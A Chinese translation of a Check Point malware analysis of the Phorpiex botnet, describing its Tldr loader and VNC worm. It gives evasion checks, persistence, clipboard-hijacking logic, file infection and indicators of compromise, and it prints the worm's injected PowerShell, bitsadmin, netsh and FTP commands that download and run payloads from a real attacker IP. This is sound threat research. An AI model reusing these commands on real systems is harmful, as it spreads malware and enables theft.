**Phorpiex僵尸网络中有超过1,000,000台被感染的Windows计算机。
在以前的文章中写了关于僵尸网络体系结构，其命令和控制基础架构以及货币化方法的文章：《[Phorpiex
Breakdown》](https://research.checkpoint.com/2019/phorpiex-breakdown/)，《[In the
Footsteps of a Sextortion Campaign](https://research.checkpoint.com/2019/in-the-footsteps-of-a-sextortion-campaign/)》，在本文中会对该僵尸网络的恶意模块的技术细节进行分析。**

## 综述

Phorpiex僵尸网络的核心部分是一个名为Tldr的加载程序。 它负责将其他恶意模块和其他恶意软件加载到受感染的计算机。
每个模块都是单独的Windows可执行文件。 通常Phorpiex模块非常小而简单。
恶意软件配置（通常包括C＆C服务器地址，加密货币钱包和恶意有效负载的URL）被硬编码在恶意软件可执行文件中。
如果需要更新配置，僵尸网络只需将新模块加载到受感染的计算机即可。 这些模块会经常进行更新，进行细微的更改。 2019年期间发现了以下类型的模块：

> Loader Phorpiex Tldr.
>
> VNC Worm Module.
>
> NetBIOS Worm Module.
>
> XMRig Silent Miner.
>
> Spam Module: Self-spreading and Sextortion
>
> Auxiliary modules (小型目标定位和痕迹清理模块).

这些模块中的3个（Tldr，VNC蠕虫和NetBIOS蠕虫）具有自行传播功能。 例如，Tldr具有感染病毒功能，能够感染其他文件。
VNC蠕虫使用弱密码连接到VNC服务器，并尝试通过模拟用户输入来进行感染。第一部分中详细分析其中两个模块：Loader Phorpiex Tldr，VNC
Worm Module.

## Phorpiex Tldr

Tldr（“ TrikLoader”）是Phorpiex僵尸网络基础结构的关键部分之一。

![](https://image.3001.net/images/20200316/1584342419_5e6f25931cd02.png!small)

首次发现该恶意软件时，无法识别它或分析与其它僵尸网络的联系。 但是从它的二进制代码，mutex名称和逃避沙箱检测等技术可以看出，此恶意软件和Phorpiex
Trik IRC bot是由同一批网络犯罪分子开发的，在Trik和Tldr C＆C服务器之间还发现了几个交叉点。

目前存在大量的Phorpiex
Tldr版本，每个版本具有不同的功能。分析的重点是它们共有的功能，特别是最新版本（自2019年7月起）中添加的新功能。Tldr恶意软件的主要目的是向受感染的计算机下载并执行其他模块和恶意软件。
Tldr还具有自我传播的能力，它类似于蠕虫或文件病毒，可感染其他软件。

![](https://image.3001.net/images/20200316/1584342672_5e6f26901b31b.png!small)

### 规避技术

Phorpiex Tldr使用简单的沙盒规避技术。 启动后，它将调用GetModuleHandle API函数以检查进程中是否加载了以下模块之一：

> SBIEDLL.DLL
>
> SBIEDLLX.DLL
>
> WPESPY.DLL
>
> DIR_WATCH.DLL
>
> API_LOG.DLL
>
> DIR_WATCH.DLL
>
> PSTOREC.DLL

然后，它枚举正在运行的进程并检查进程文件名是否为以下之一：

> VBOXSERVICE.EXE
>
> VBOXTRAY.EXE
>
> VMTOOLSD.EXE
>
> VMWARETRAY.EXE
>
> VMWAREUSER
>
> VMSRVC.EXE
>
> VMUSRVC.EXE
>
> PRL_TOOLS.EXE
>
> XENSERVICE.EXE

较旧版本的Tldr（TldrV3，2018年5月）也会检查这些进程：然后枚举正在运行的进程并检查进程名是否以下之一：

> python.exe
>
> pythonw.exe
>
> prl_cc.exe
>
> vboxservice.exe
>
> vboxcontrol.exe
>
> tpautoconnsvc.exe

最后，Tldr调用IsDebuggerPresent API函数检查是否正在调试恶意软件。如果一项检查没有通过，Tldr会停止执行。

### 初始化

初始化步骤与Phorpiex Trik的初始化步骤非常相似。为了防止运行多个Phorpiex
Tldr，它将创建一个具有特定硬编码名称的互斥。较早版本使用版本号的互斥锁名称，例如“ TldrV3”。 在最新版本中，每个系列的互斥体名称不同。
通常由几位数字组成，例如：“ 6486894”。

![](https://image.3001.net/images/20200316/1584343000_5e6f27d8d269d.png!small)

下一步所有Phorpiex样本都是相同的：删除“：Zone.Identifier”替代数据流。
执行此操作是为了消除文件源是不受信任源的问题。自2019年7月起的版本（Tldr v5.0）拥有Debug特权：

![](https://image.3001.net/images/20200316/1584343166_5e6f287e60375.png!small)

### 持久化

Tldr将自身复制到以下文件夹：

> %windir%
>
> %userprofile%
>
> %systemdrive% (only version from July 2019)
>
> %temp%

对于Phorpiex Tldr V3，选择路径和文件名与Phorpiex Trik相同。 Tldr在这些路径下创建一个带有以“
T-”开头（在Phorpiex Trik中，名称以“ M-”开头）的子文件夹。 然后，恶意软件将其可执行文件复制到文件夹中。 例如：

> C:\WINDOWS\T-9759504507674060850740\winsvc.exe

与Phorpiex Tldr v3不同，较新的版本仅在文件名不包含“ sys”子字符串的情况下才会进行创建复制。 它使用随机数字生成的子文件夹名称和以“
sys”开头加4个随机字母的文件名：

![](https://image.3001.net/images/20200316/1584343387_5e6f295bcd6bc.png!small)

> C:\WINDOWS\2813528135\sysjekp.exe

Phorpiex
Tldr为创建的文件和子文件夹设置属性FILE_ATTRIBUTE_READONLY，FILE_ATTRIBUTE_HIDDEN，FILE_ATTRIBUTE_SYSTEM。然后设置注册表自动运行：

> HKCU\Software\Microsoft\Windows\CurrentVersion\Run\
>
> HKLM\Software\Microsoft\Windows\CurrentVersion\Run\

Tldr使用硬编码创建新的注册表值。研究样本中名称为“ Windows Operating System”：

![](https://image.3001.net/images/20200316/1584343524_5e6f29e433de4.png!small)

它通过注册表项添加防火墙规则：

>
> SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\AuthorizedApplications\List\

![](https://image.3001.net/images/20200316/1584343574_5e6f2a16d9b02.png!small)

### 绕过windows安防措施

2019年7月以来的Phorpiex Tldr版本（Tldr v5）通过设置以下注册表值来禁用Windows安全功能，例如Windows
Defender，安全通知和系统还原：

![](https://image.3001.net/images/20200316/1584343636_5e6f2a5490f42.png!small)

### 主要功能

每个恶意活动Phorpiex Tldr都会创建一个单独的线程。

 **Crypto Clipper**

所有样本都包含用于窃取加密货币的功能，通过更改受感染系统剪贴板中的加密货币钱包的地址实现。恶意软件每200毫秒调用API函数OpenClipboard和GetClipboardData查询剪贴板数据。为了确定剪贴板中是否包含加密钱包地址，Phorpiex
Tldr进行了以下检查：

> 1、首字母是否是：1, 3, q, 2, X, D, 0, L, 4, P, t, z, G, U, E；
>
> 2、长度在25到45个字符或是9个字母，或90至115个字母；
>
> 3、不包含O (0x4F), I (0x49), l (0x6C)；
>
> 4、只含有数字和字母；

任何一项检查失败，剪贴板保持不变。 否则，它将进一步确定加密货币钱包地址类型，将其更改为硬编码值之一。 Phorpiex
Tldr通过剪贴板数据的第一个字符确定类型：

![](https://image.3001.net/images/20200316/1584343960_5e6f2b9829a3d.png!small)

支持的加密货币类型包括：

> Bitcoin
>
> Bitcoin Cash
>
> Ethereum
>
> DASH
>
> Dogecoin
>
> Litecoin
>
> Monero
>
> Zcash

Crypto Clipper还处理Perfect Money钱包（金，美元，欧元）：

![](https://image.3001.net/images/20200316/1584344077_5e6f2c0d0bf48.png!small)

 **Self-spreading**

该线程中实现了文件蠕虫功能。在无限循环中，Tldr使用GetLogicalDrives枚举可用的驱动器。读取“
Software\Microsoft\Windows\CurrentVersion\Policies\Explorer”注册表项值“
NoDrives”，从枚举中排除NoDrives Windows资源管理器策略禁用的驱动器，选择可移动和远程驱动器。在每个选定的驱动器上，将创建一个名为“
__”的文件夹，并将属性设置为FILE_ATTRIBUTE_READONLY，FILE_ATTRIBUTE_HIDDEN和FILE_ATRRIBUTE_SYSTEM，使其在资源管理器中不可见。

恶意软件会使用硬编码名称（示例中为“ DriveMgr.exe”）将自身复制到此文件夹中。
Tldr获取所选驱动器的卷名称。然后在所选驱动器的根文件夹中创建一个名为“ {volume_name} .lnk”的快捷方式：

> %windir%\system32\cmd.exe /c start __ & __\DriveMgr.exe & exit

然后Tldr将所有文件夹从所选驱动器的根路径移至文件夹“ __”。它还会删除根路径中具有以下扩展名的所有文件：

> *.lnk, *.vbs, *.bat, *.js, *.scr, *.com, *.jse, *.cmd,*.pif, *.jar, *.dll,
> *.vbe, *.inf”

![](https://image.3001.net/images/20200316/1584344330_5e6f2d0a40e6d.png!small)

这样做的原因可能是禁用在同一驱动器上的所有其他蠕虫。在Tldr
v5.0中引入了一项新功能，允许恶意软件充感染其他可执行文件。此前，Phorpiex使用单独的模块来感染其他软件。恶意软件会扫描可移动和远程驱动器上的所有文件夹，并感染所有尚未感染的.exe文件。

为了感染PE文件，Tldr执行以下修改：增加PE文件头中节的数量，并将头的TimeDateStamp值设置为0x0000DEAD：

![](https://image.3001.net/images/20200316/1584344444_5e6f2d7c5d4f5.png!small)

恶意软件还使用TimeDateStamp中的值来检测文件是否已被感染。 值0x0000DEAD转换为时间戳1970-01-01
15:50:05。使用以下查询可以在VirusTotal上轻松找到被感染的样本：

> pets:1970-01-01T15:50:05

Tldr还会创建一个名为“ .zero”的新代码段，将恶意负载复制到该段。 修改入口点地址指向所创建节的开头。该恶意软件不会重新计算校验和，只是重置为0。

![](https://image.3001.net/images/20200316/1584344564_5e6f2df47beec.png!small)

恶意软件在主代码中写入其相对地址：

![](https://image.3001.net/images/20200316/1584344618_5e6f2e2a17f97.png!small)

使用值0xCCCCCCCC在模板函数中找到原始入口点：

![](https://image.3001.net/images/20200316/1584344725_5e6f2e95f3963.png!small)

 **Shellcode**

插入受感染文件中的shellcode由几个功能组成。 不使用绝对地址，放置在任何内存位置时都能够正确运行。

首先，shellcode检查文件“％appdata％\
winsvcs.txt”是否存在。如果该文件存在，shellcode不会执行任何操作，只将控制权传递给感染程序的原始入口点；文件存在，则将从硬编码的URL下载并执行另一个文件：

![](https://image.3001.net/images/20200316/1584344948_5e6f2f74b70c3.png!small)

使用URLDownloadToFileW将文件下载到临时文件。 使用函数GetTempPathW和GetTempFileNameW获得临时文件的名称。
如果文件下载成功，shellcode将从该文件中删除“：Zone.Identifier” ADS，并使用CreateProcessW执行该文件。

 **C &C检查**

首次运行时，Phorpiex Tldr使用C＆C服务器的硬编码列表对其C＆C服务器发出HTTP请求：

![](https://image.3001.net/images/20200316/1584345048_5e6f2fd827b04.png!small)

Tldr为每个C＆C服务器创建一个线程。 在启动线程之前，恶意软件会创建一个空文件“％appdata％\ winsvcs.txt”。
该文件用作确定恶意软件是否首次运行的标志。 如果该文件已经存在，则不会创建线程。

在每个线程中，恶意软件都会查询以下URL：

> http://<cnc_host>/t.php?new=1

在其他样本中还看到了不同格式的URL，例如：

> http://<cnc_host>/tldr.php?new=1
>
> http://<cnc_host>/tldr.php?on=1
>
> http://<cnc_host>/tldr.php?new=1&id=<random_number>
>
> http://<cnc_host>/tldr.php?new=1&on=<random_number>

为了执行请求，Phorpiex Tldr对用户请求头使用特定的硬编码值。2019年7月开始的值是：

> Mozilla / 5.0（Windows NT 10.0; Win64; x64; rv：67.0）Gecko / 20100101 Firefox
> / 67.0

较旧版本的值：

> Mozilla / 5.0（Macintosh; Intel Mac OS X 10.9; rv：25.0）Gecko / 20100101
> Firefox / 25.0

生成的HTTP请求如下所示：

![](https://image.3001.net/images/20200316/1584345190_5e6f3066301f1.png!small)

 **主线程**

Phorpiex Tldr主要目的是在受感染的主机上下载并执行其他恶意负载。它使用硬编码的路径（通常4到8个）来创建用于下载文件的URL：

![](https://image.3001.net/images/20200316/1584345273_5e6f30b923fe9.png!small)

> http://<cnc_domain>/1.exe
>
> http://<cnc_ domain>/2.exe

每个生成的URL，恶意软件首先使用InternetOpenUrlA和HttpQueryInfoA检查其可用性和大小。
如果URL可用，则Tldr会记住每个路径的大小。
如果大小与先前的值相同，则将跳过URL，防止重新下载。如果URL可用或者内容长度与先前的值不同，Tldr将下载并执行它。下载的文件保存在％temp％文件夹下，名称为：

> “%d.exe” % random.randint(10000, 40000)

Tldr会有两次下载文件的尝试：使用InternetOpenUrlW /
InternetReadFile；如果第一次失败，则使用URLDownloadToFileW。下载文件后，Porpiex
Tldr删除“：Zone.Identifier”。然后使用CreateProcess两次执行下载的文件，如果第一次失败，则使用ShellExecute。

最新的Tldr版本（v5）有了重大改进，使用带有R**和RSA-SHA1签名验证的文件。加密文件头包含魔术字节（“
NGS！”），RSA签名的长度以及用于验证文件的RSA签名。 RSA签名的前16个字节用作R**解密密钥：

![](https://image.3001.net/images/20200316/1584345554_5e6f31d212e8c.png!small)

Phorpiex Tldr使用文件中的16字节R**密钥解密数据，然后计算解密文件的SHA1哈希。
为了验证数字签名，Tldr使用硬编码到样本中的4096位RSA公钥。

![](https://image.3001.net/images/20200316/1584345586_5e6f31f2e6868.png!small)

## VNC Worm 模块

在Phorpiex中发现的模块之一是恶意VNC客户端。它没有自己的持久性机制，每次都会由Tldr执行。恶意软件会扫描随机IP地址查找开放的VNC服务器端口（5900），使用硬编码的列表进行暴力攻击。
最终目标是在目标主机上加载并执行另一个恶意软件（通常是Phorpiex Tldr）。

Phorpiex VNC蠕虫执行一开始就利用API bombing技术规避沙盒。 它在循环中执行多个函数的大量无意义的调用：

![](https://image.3001.net/images/20200316/1584346051_5e6f33c384602.png!small)

使用硬编码名称的互斥锁来防止多次执行：

![](https://image.3001.net/images/20200316/1584346212_5e6f34646bd05.png!small)

攻击本身是无限循环的。使用rand函数随机生成用于扫描的IP地址，将GetTickCount作为随机种子。
IP地址的唯一过滤规则是它不能以127、172或192开头。如果成功连接到TCP端口5900，VNC蠕虫会使用密码列表对发现的VNC服务器发起暴力攻击：

![](https://image.3001.net/images/20200316/1584346282_5e6f34aa77ff1.png!small)

密码列表在不同样本中可能有所不同。如果攻击成功，使用以下格式的URL将结果报告给C＆C服务器：

hxxp://92.63.197.153/result.php?vnc=%s|%s” % (host, password)

最后，Phorpiex VNC通过使用VNC协议模拟键盘输入，在受害者的计算机上执行多个脚本。

![](https://image.3001.net/images/20200316/1584346378_5e6f350a2cdb8.png!small)

执行以下操作：

    
    
    cmd.exe /c PowerShell -ExecutionPolicy Bypass (New-Object System.Net.WebClient).DownloadFile(‘<http://92.63.197.153/vnc.exe>’,’%temp%\48303045850.exe’);Start-Process ‘%temp%\48303045850.exe’
    
    cmd.exe /c bitsadmin /transfer getitman /download /priority high<http://92.63.197.153/vnc.exe>%temp%\49405003030.exe&start %temp%\49405003030.exe
    
    cmd.exe /c netsh firewall add allowedprogram C:\Windows\System32\ftp.exe “ok” ENABLE&netsh advfirewall firewall add rule name=”ok” dir=in action=allow program=”C:\Windows\System32\ftp.exe” enable=yes
    
    cmd.exe /c “cd %temp%&@echo open 92.63.197.153>>ftpget.txt&@echo tom>>ftpget.txt&@echo hehehe>>ftpget.txt&@echo binary>>ftpget.txt&@echo get vnc.exe>>ftpget.txt&@echo quit>>ftpget.txt&@ftp -s:ftpget.txt&@start vnc.exe”

Phorpiex VNC蠕虫会使受害者的计算机通过HTTP或FTP从服务器上下载并执行恶意脚本：

> ftp://tom:hehehe@92.63.197[.]153/vnc.exe
>
> ftp://tom:hehehe@92.63.197[.]153/ohuh.exe
>
> [http://92.63.197](https://www.freebuf.com/wp-> admin/post.php?post=230546&action=edit)[.]153/vnc.exe
>
> [http://92.63.197](https://www.freebuf.com/wp-> admin/post.php?post=230546&action=edit)[.]153/ohuh.exe

## IOC

### Phorpiex Tldr

![](https://image.3001.net/images/20200316/1584346479_5e6f356fa3d2d.png!small)

### Phorpiex Tldr C&C IP和域

> 185.176.27.132
>
> 193.32.161.69
>
> 193.32.161.73
>
> 193.32.161.77
>
> 92.63.197.153
>
> 92.63.197.38
>
> 92.63.197.59
>
> 92.63.197.60
>
> 94.156.133.65
>
> aiiaiafrzrueuedur.ru
>
> fafhoafouehfuh.su
>
> ffoeefsheuesihfo.ru
>
> osheoufhusheoghuesd.ru
>
> ouhfuosuoosrhzfzr.ru
>
> slpsrgpsrhojifdij.ru
>
> unokaoeojoejfghr.ru
>
> b0t.to
>
> thaus.to
>
> thaus.top

### Phorpiex Tldr相关url

> hxxp://185.176.27[.]132/a.exe
>
> hxxp://aiiaiafrzrueuedur.ru/o.exe
>
> hxxp://185.176.27[.]132/1
>
> hxxp://185.176.27[.]132/2
>
> hxxp://185.176.27[.]132/3
>
> hxxp://185.176.27[.]132/4
>
> hxxp://185.176.27[.]132/5
>
> hxxp://185.176.27[.]132/6
>
> hxxp://185.176.27[.]132/7
>
> hxxp://193.32.161[.]69/1.exe
>
> hxxp://193.32.161[.]69/2.exe
>
> hxxp://193.32.161[.]69/3.exe
>
> hxxp://193.32.161[.]69/4.exe
>
> hxxp://193.32.161[.]69/5.exe
>
> hxxp://193.32.161[.]69/6.exe
>
> hxxp://193.32.161[.]69/7.exe
>
> hxxp://193.32.161[.]69/ya.exe
>
> hxxp://193.32.161[.]73/1
>
> hxxp://193.32.161[.]73/2
>
> hxxp://193.32.161[.]73/3
>
> hxxp://193.32.161[.]73/4
>
> hxxp://193.32.161[.]73/5
>
> hxxp://193.32.161[.]73/6
>
> hxxp://193.32.161[.]73/s.exe
>
> hxxp://193.32.161[.]77/11.exe

### Phorpiex VNC Worm

![](https://image.3001.net/images/20200316/1584346559_5e6f35bfb2767.png!small)

 ***参考来源：[checkpoint](https://research.checkpoint.com/2020/phorpiex-arsenal-part-i/)，由Kriston编译，转载请注明来自FreeBuf.COM**

